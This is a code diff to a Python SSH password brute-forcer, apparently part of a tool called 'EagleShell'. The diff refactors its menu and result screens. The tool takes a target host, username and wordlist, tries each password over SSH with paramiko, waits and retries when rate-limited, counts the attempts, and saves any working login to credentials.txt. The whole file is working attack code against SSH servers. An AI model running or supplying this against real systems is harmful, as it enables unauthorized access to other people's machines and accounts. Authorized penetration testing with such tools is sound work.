@@ -16,6 +16,20 @@ import time
 # Main Function
 def brutessh_main():
 
+    # Function that sets all
+    def set_all():
+        global password_found
+        global password_tried
+        global host_set
+        global user_set
+        global wordlist_set
+        host_set = ''
+        user_set = ''
+        wordlist_set = ''
+        password_found = ''
+        password_tried = 0
+        configuration()
+
     # Function that takes some user input
     def configuration():
         try:
@@ -47,7 +61,6 @@ def brutessh_main():
             print('\tZ): Back')
             print('\tX): Exit')
             print('')
-            os.system('sleep 0.01')
             while True:
                 host_set = input('\u001b[33mHOST \u001b[37m> ').lower()
                 if host_set == 'z':
@@ -68,8 +81,30 @@ def brutessh_main():
         except KeyboardInterrupt:
             exit_shell()
 
+    # Function that displays before bruteforce
+    def process():
+        os.system(clear_screen)
+        print(logo)
+        print('')
+        print(line)
+        print(brutessh_banner)
+        print(line)
+        print('')
+        print(author)
+        print('Process:')
+        print('')
+        print('\tStatus')
+        print('\t------')
+        print('')
+        print('\tStop: CTRL+C')
+        print('')
+        set_ready()
+        result()
+
     # Function that brute forces
     def is_ssh_open(hostname, username, password):
+        global password_tried
+        global password_found
         # initialize SSH client
         client = paramiko.SSHClient()
         # add to know hosts
@@ -78,23 +113,26 @@ def brutessh_main():
             client.connect(hostname=hostname, username=username, password=password, timeout=3)
         except socket.timeout:
             # this is when host is unreachable
-            print("\u001b[31m[!] Host: " + hostname + " is unreachable, timed out.")
+            print("\t\u001b[31m[!] Host: " + hostname + " is unreachable, timed out.")
             return False
         except paramiko.AuthenticationException:
-            print("\u001b[31m[!] Invalid credentials for " + username + ":" + password)
+            print("\t\u001b[31m[!] Invalid credentials for " + username + ":" + password)
+            password_tried = password_tried + 1
             return False
         except paramiko.SSHException:
-            print("\u001b[36;1m[*] Quota exceeded, retrying with delay...")
+            print("\t\u001b[36;1m[*] Quota exceeded, retrying with delay...")
             # sleep for a minute
             time.sleep(60)
             return is_ssh_open(hostname, username, password)
+        except KeyboardInterrupt:
+            result()
         else:
             # connection was established successfully
-            print("\u001b[32;1m[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{Style.RESET_ALL}")
-            return True
+            password_found = password
+            result()
 
     # Function that does the process
-    def process():
+    def set_ready():
         # read the file
         passwords = open(wordlist_set).read().split("\n")
         # brute-force
@@ -104,6 +142,41 @@ def brutessh_main():
                 open("credentials.txt", "w").write(f"{user_set}@{host_set}:{password}")
                 break
 
+    # Function that displays result
+    def result():
+        try:
+            os.system(clear_screen)
+            print(logo)
+            print('')
+            print(line)
+            print(brutessh_banner)
+            print(line)
+            print('')
+            print(author)
+            print('Result:')
+            print('')
+            if len(password_found) > 1:
+                print('\tPASSWORD: \u001b[32;1m' + password_found + '\u001b[37m')
+            else:
+                print('\t\u001b[37mPASSWORD: \u001b[31mNot Found.\u001b[37m')
+            print('')
+            if len(password_found) > 1:
+                print('\tPASSWORDS TRIED: \u001b[32;1m' + str(password_tried) + '\u001b[37m')
+            else:
+                print('\tPASSWORDS TRIED: \u001b[31m' + str(password_tried) + '\u001b[37m')
+            print('')
+            print('\tX): Exit')
+            print('')
+            while True:
+                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
+                if eagleshell_cmd == 'x':
+                    exit_shell()
+                else:
+                    print('\u001b[31m[-] Invalid Input.')
+                    continue
+        except KeyboardInterrupt:
+            exit_shell()
+
     # The function where you exit
     def exit_shell():
         print('\n\u001b[31m[-] Exiting EagleShell')
@@ -112,7 +185,7 @@ def brutessh_main():
         os.system(clear_screen)
         exit()
 
-    configuration()
+    set_all()
 
 
 brutessh_main()
